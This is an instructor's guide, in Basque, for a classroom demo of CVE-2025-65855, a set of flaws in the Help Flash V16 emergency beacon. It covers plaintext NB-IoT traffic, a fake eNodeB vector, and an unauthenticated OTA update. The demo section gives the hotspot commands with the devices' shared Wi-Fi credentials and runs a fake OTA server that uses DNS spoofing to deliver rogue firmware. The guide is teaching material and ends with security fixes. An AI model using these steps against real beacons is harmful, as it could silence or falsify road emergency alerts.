# Demo irakaslearentzat — V16 Balizetan Ahultasunak: CVE-2025-65855
## Irakaslearen gida · Bloke teorikoa + zuzeneko demo

[Gaztelaniazko bertsioa](05_Demo_Vulnerabilidades_Help_Flash.md)

> **Saio mota:** Irakaslearen azalpena + proiektutako demo  
> **Iraupena:** ~45 minutu  
> **Programan non:** 3. eguna — V16/DGT 3.0 blokea  
> **Erreferentzia materiala:** [CVE-2025-65855](https://www.cve.org/CVERecord?id=CVE-2025-65855) · [Jatorrizko artikulua](https://github.com/LuisMirandaAcebedo/security_articles)

---

## Beharrezko materialak

| Materiala | Derrigorrez | Oharrak |
|---|---|---|
| Linux ordenagailua (Ubuntu/Kali) WiFi-arekin | ✅ | Irakasleak proiektatu |
| Help Flash IoT baliza | ✅ | Ikastaroa baino lehen eskuratu |
| `scripts/fake_ota_server.py` | ✅ | Repo-an dago jada |
| Python 3.8+ | ✅ | Stdlib soilik, ezer instalatu gabe |
| `nmcli` (NetworkManager) | ✅ | Ubuntu/Kali-n aurreinstalatu |
| HDMI kablea / proiektorea | ✅ | Gelak terminala ikusteko |

---

## Saioaren egitura

| Denbora | Blokea | Formatua |
|---|---|---|
| 00:00–10:00 | V16/DGT 3.0 sistemaren arkitektura | Azalpena + diagrama |
| 10:00–20:00 | Ahultasunak (teoria) | Aurkezpena |
| 20:00–38:00 | Zuzeneko demo: OTA erasoa | Proiektutako terminala |
| 38:00–45:00 | Nola egin beharko litzateke? + eztabaida | Eztabaida |

---

## 1. BLOKEA — Sistemaren arkitektura (10 minutu)

### Nola funtzionatzen du V16 baliza batek?

```
[V16 Baliza]                [Fabrikatzailearen zerbitzaria]    [DGT 3.0]
     |                              |                              |
     |── GPS koord. ─────────────>|                              |
     |   IMEI, Cell ID, timestamp  |                              |
     |   UDP protokoloa ARGIAN     |── HTTP alerta ─────────────>|
     |                             |                              |── Google Maps
     |   NB-IoT sare pribatua      |                              |── Autobideko panelak
     |   (Vodafone APN pribatua)   |                              |── Waze / nabigazioa
```

**Azalpen puntuak:**
- Gailua **NB-IoT** bidez konektatzen da (banda estua, kontsumio txikia, irismen handia)
- Baliza ↔ zerbitzari komunikazioa **APN pribatu** baten bidez (Vodafone sare isolatua)
- Fabrikatzailearen zerbitzariak alertak DGT 3.0-ra bidaltzen ditu interneten bidez
- DGT 3.0-k nabigazioko app-etara eta autopistako paneletara banatzen ditu
- Analizatutako gailua: **Help Flash IoT** — Espainian 250.000+ unitate saldu

> **Hasierako hausnarketarako:** *"Zenbat puntu ahul ikusten dituzue diagrama honetan ezer esan baino lehen?"*

---

## 2. BLOKEA — Ahultasunak (10 minutu)

### 1. Ahultasuna — Komunikazio argiak (NB-IoT)

**Arazoa:** dena testu lauean doa, enkriptatu gabe eta autentifikatu gabe.

| Transmititutako datua | Interceptatuz gero ondorioa |
|---|---|
| GPS koordenatu zehatzak | Larrialdiko pertsonaren denbora errealeko kokapena |
| Gailuaren IMEI | Baliza ordezkatzeko aukera (eta karkasaren azpian inprimatuta dago) |
| Cell ID + seinale intentsitatea | Posizioa triangulatzeko aukera gehigarria |
| Aktibazioaren timestamp | Nor, noiz eta zenbat aldiz erabili den jakitea |

**Fabrikatzailearen argudioa:** *"APN pribatua erabiltzen dugu, inork ezin du sartu"*

**Argudioaren arazoa:** konexio-parametroak gailuaren serie-portuan agerian daude:
```
AT+QBAND=3,20,8,28
AT+COPS=0
AT+QCGDEFCONT="IP",""
```
Sarbide fisikoaz eta eSIM aterata, erasotzaileak APN pribatura konektatu dezake. Eta sarbide fisikorik gabe, **fake eNodeB** bektore bat dago.

**Bektore aurreratua — Fake eNodeB:**
- SDR (BladeRF / USRP B210 / LimeSDR): ~500–1000 €
- Software librea: srsRAN, OpenAirInterface
- NB-IoT 3/20/8/28 bandetan jamming → baliza dorre faltsura konektatzen da
- **A modua (DoS):** alertak hutsera bidalita, larrialdi errealak DGT-ra heltzen ez
- **B modua (MitM):** GPS koordenatuen aldaketa, alarma faltsuak injektatu

> Ahultasun honek **V16 baliza modelo guztiei** eragiten die, Help Flash soilik ez.

---

### 2. Ahultasuna — OTA eguneratzea autentifikatu gabe

**Hau da zuzenean erakutsiko duguna.**

| Segurtasun-hutsa | Xehetasuna |
|---|---|
| WiFi kredentzial berdintsuak | SSID eta pasahitza **berdinak** 250.000+ gailutan |
| Autentifikazio gabeko aktibazio | Pizteko botoia **8 segundoz** eduki → OTA modua |
| HTTP eta ez HTTPS | Firmware argian deskargatua, 8080 portuan |
| Sinadura digitalik ez | Gailuak edozein firmware instalatzen du iturria egiaztatu gabe |
| DNS DNSSEC gabe | Zerbitzariaren hostnamea SSID-etik eratorria, edozein DNS-k ebatz dezakeena |

**Kredentzial publikoak:**
```
SSID:      HF-UpdateAP-5JvqFV
Pasahitza: HF-UpdateAP-5JvqFV   ← SSID-arekin berdina
```

**Efektu kaskada:** OTA ahultasunek "une fisikoko sarbidea" (botoia sakatu) **urruneko konpromiso iraunkorrean** bihurtzen dute. Firmware maltzurra instalatutakoan, erasotzaileak APN pribatura sarbidea du edonondik.

---

## 3. BLOKEA — Zuzeneko demo: OTA erasoa (18 minutu)

> Irakaslearen terminala proiektatu. Urrats bakoitza poliki egin, bakoitza komentatu.

### 1. urratsa — WiFi AP faltsua prestatu (2 minutu)

```bash
# Balizak erabiltzen dituen kredentzial zehatzak dituen hotspot-a sortu
nmcli device wifi hotspot \
  ifname wlan0 \
  ssid "HF-UpdateAP-5JvqFV" \
  password "HF-UpdateAP-5JvqFV" \
  band bg

# AP aktibo dagoela egiaztatu
nmcli device show wlan0 | grep -E "IP4|STATE"
```

> **Gelan esan:** *"Hau da erasotzaileak tranpa-sarea sortzeko behar duen guztia. Eraikin honetan OTA moduan dagoen edozein baliza hemen konektatuko litzateke automatikoki."*

**nmcli huts egiten badu** (wlan0 okupatuta edo izen desberdina):
```bash
# WiFi interfaze eskuragarriak ikusi
iw dev

# create_ap-rekin alternatiba (instalatuta badago)
create_ap wlan0 eth0 "HF-UpdateAP-5JvqFV" "HF-UpdateAP-5JvqFV"
```

---

### 2. urratsa — HTTP zerbitzari faltsua abiarazi (1 minutu)

```bash
# Repositorioko erroan
cd Automocion_V16_Ciber/scripts/

# DNS wildcard integratuekin (gomendatua)
sudo python3 fake_ota_server.py --dns

# DNS gabe (hotspot-eko dnsmasq-ek behar bezala ebazten badu)
python3 fake_ota_server.py
```

**Terminalean espero den irteera:**

```
╔══════════════════════════════════════════════════════════════╗
║        SERVIDOR OTA FALSO — DEMO PEDAGÓGICA                  ║
║        CVE-2025-65855 · Help Flash IoT                       ║
╚══════════════════════════════════════════════════════════════╝

[09:15:03] [INFO] IP del servidor  : 192.168.x.x
[09:15:03] [DNS]  Servidor DNS wildcard activo en 0.0.0.0:53
[09:15:03] [HTTP] Servidor HTTP escuchando en 0.0.0.0:8080
[09:15:03] [HTTP] Esperando conexión de la baliza...
```

---

### 3. urratsa — Balizan OTA modua aktibatu (2 minutu)

1. Baliza normalean piztu
2. LEDek keinukatzen hasita itxaron (GPS bilatzen)
3. **Pizteko botoia 8 segundoz luze sakatu**
4. LEDen eredua aldatuko da → OTA modua aktibo
5. Zerbitzariaren terminala behatu

> **Gelan esan:** *"Botoi hau tresnarik gabe eskura dago. Tailer batean, gasolinera batean, edo norbait baliza eskuan zeramalarik igarotzean."*

---

### 4. urratsa — Erasoa behatu (3 minutu)

**Terminaleko gertaeren sekuentzia:**

```
[09:15:11] [DNS]  Query desde 192.168.x.x → 192.168.x.x   ← DNS spoofed
[09:15:12] [HTTP] ⬇  settings.json entregado a 192.168.x.x
[09:15:12] [HTTP]    → firmware URL: http://192.168.x.x:8080/update/firmware_v99.bin
[09:15:13] [HTTP] 🚨 FIRMWARE MALICIOSO entregado a 192.168.x.x
[09:15:13] [HTTP]    → 891 bytes transferidos sin autenticación
```

**Denbora totala: ~30–60 segundu botoia sakatutatik.**

> **Gelan esan:** *"Gailuak ez zuen ezer egiaztatu. Ez dago TLS ziurtagiririk. Ez dago sinadura digitalik. Ez dago PINik. Guk emandakoa deskargatu zuen, besterik gabe."*

---

### 5. urratsa — Emaitzak interpretatu (5 minutu)

**Terminalean erakutsi erasotzaileak orain izango lukeena:**

```bash
# Benetako eraso batean, firmware maltzurrak aukera emango luke:
# 1. GPS faltsua DGT 3.0-ra bidaltzea → istripuak non ez dauden alertatzea
# 2. Benetako larrialdia isiltzeea → LEDak piztuta baina DGT-ra daturik bidali gabe
# 3. Vodafone APN pribatura sarbidea → atzeko ate iraunkorra baliza sare osora
# 4. 250.000 baliza botnet bihurtzea → kredentzial berdinak = PoC bakarrak parke osoa konprometi
```

---

### 6. urratsa — Benetako eszenatokiak (5 minutu, eztabaida)

| Eszenatokia | Bektorea | Eragina |
|---|---|---|
| **Tailer maltzurra** | Une fisikoko sarbidea berrikustean | Bezeroaren baliza konprometitua, ez daki |
| **Gasolinera/zerbitzu-area** | AP faltsua trafiko handiko gunean | OTA moduan dagoen edozein balizaren konpromiso automatiko masiboa |
| **SDR-dun furgoneta** | Fake eNodeB mugikorra | Ehunka metroko erradioan baliza guztiak interceptatu/isilarazi |
| **Konspirazio-erabiltzailea** | Auto-aldaketa | Balizak homologatuta dirudien baina daturik bidaltzen ez |

> **Gelako galdera:** *"Zein eszenatoki da errealistagoa? Eta zein arriskutsuagoa segurtasun bialaren ikuspuntutik?"*

---

## 4. BLOKEA — Nola egin beharko litzateke? (7 minutu)

### Baliza honek betetzen ez dituen IoT segurtasun-checklist-a

```
✗ Komunikazio enkriptatu gabe    → ✅ beharko luke: MQTT TLS bidez / CoAP DTLS-rekin
✗ Jatorriaren autentifikaziorik ez → ✅ beharko luke: elkarrekiko ziurtagiriak (mTLS)
✗ Mezuaren integritate gabe      → ✅ beharko luke: HMAC edo sinadura digital trama bakoitzean
✗ Kredentzial hardcoded          → ✅ beharko luke: gailuz gailu kredentzial bakarrak
✗ Kredentzial eta SSID berdinak  → ✅ beharko luke: fabrikan sortutako pasahitza, eredurik gabe
✗ HTTP firmware deskargarako     → ✅ beharko luke: HTTPS ziurtagiri egiaztatu batekin
✗ Firmware sinadura gabe         → ✅ beharko luke: firmware sinatua + Secure Boot
✗ OTA autentifikazio gabe        → ✅ beharko luke: PIN bakarra + app-en baiezpena
✗ Serie portua irekita           → ✅ beharko luke: produkzioan desgaitu edo babestuta
✗ Secure Boot desgaituta         → ✅ beharko luke: produkzioan derrigorrez aktibo
```

**Arau-esparru garrantzitsua:**
- **UNECE R155:** Ibilgailuen zibersegurtasuneko araudia (2022)
- **ISO/SAE 21434:** Errepideko ibilgailuen zibersegurtasun ingeniaritza
- **ETSI EN 303 645:** Kontsumoko IoT-rako zibersegurtasun estandarra — unibertsalak diren kredentzial lehenetsiak espresuki debekatzen ditu

---

## Eztabaidarako galderak

1. *"Fabrikatzaileak ahultasunak 'sarbide fisikoa eskatzen dute' esanik baztertu zituen hasieran. Ados zarete sailkapen horrekin? Nola aldatu zen argudioa OTA ahultasunak agertu zirenean?"*

2. *"Gailua legez derrigorrezko da 2026tik. Homologazioaren aurretik segurtasun-ikuskaritza derrigorrezko prozesu bat egon beharko litzateke? Nork egin beharko luke?"*

3. *"Kredentzialak berdinak dira 250.000+ gailutan. Zer kostu baxuko neurri batek arrisku hau aldatu izango lukeen?"*

4. *"Ikerketa 2025eko abenduan argitaratu zen eta CVE-2025-65855 esleitu zioten. Zer egin beharko luke fabrikatzaileak ondorengo asteetan?"*

---

## Demoko arazoen konponbidea

| Arazoa | Ziurrenik zergatik | Konponbidea |
|---|---|---|
| nmcli huts: `wlan0` ez eskuragarri | Interfazearen izen desberdina | `iw dev` izen zuzena ikusteko |
| Baliza APra konektatzen ez da | OTA modua ez aktibatuta | 8 s eduki LED eredu-aldaketa arte |
| DNS 53 portua jada erabiltzen | systemd-resolved aktibo | `sudo systemctl stop systemd-resolved` aldi baterako |
| Python zerbitzaria IP errorea | Detektatutako IP hotspot-aren ez bat | `--host 192.168.X.X` parametroarekin abiarazi |
| Baliza konektatu baina deskargatu ez | Hostnamea ez ebatzi | `--dns` erabili edo hotspot-eko dnsmasq-n sarrera gehitu |

---

## Itxiera-oharrak

- Jatorrizko ikertzailea **Luis Miranda Acebedo** da. Beti aipatu iturria aurkeztean.
- Esleitutako CVE: **CVE-2025-65855** (MITRE, 2025eko abendua).
- Jatorrizko PoC-aren kode osoa **ez dago argitaratuta** ikertzailearen erabaki etikoagatik. Repo honetan dagoen scripta (`fake_ota_server.py`) kontzeptua erakusten duen berrinterpretazio pedagogiko bat da, exploit osoa erreproduzitu gabe.
- Ikerketa osoa egin zen legez eta etikan, norberaren gailuen gainean, hirugarrenen sistemetara sartu gabe.
